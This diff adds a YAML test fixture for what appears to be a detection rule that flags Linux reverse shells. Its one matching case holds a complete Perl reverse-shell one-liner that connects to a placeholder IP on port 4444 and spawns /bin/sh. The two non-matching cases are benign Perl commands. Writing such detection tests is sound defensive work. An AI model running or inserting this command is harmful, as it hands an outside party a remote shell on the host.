@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "perl socket reverse shell"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24101, "ppid": 24090, "exe": "/usr/bin/perl", "name": "perl", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "perl -e use Socket;$i=\"198.51.100.20\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+nomatch:
+  - desc: "benign lookalike - perl one-liner"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24110, "ppid": 24090, "exe": "/usr/bin/perl", "name": "perl", "uid": -1, "euid": -1, "username": "root", "cmdline": "perl -e print 42", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "perl runs a script"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24111, "ppid": 24090, "exe": "/usr/bin/perl", "name": "perl", "uid": -1, "euid": -1, "username": "root", "cmdline": "perl /usr/share/tool/report.pl --since today", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
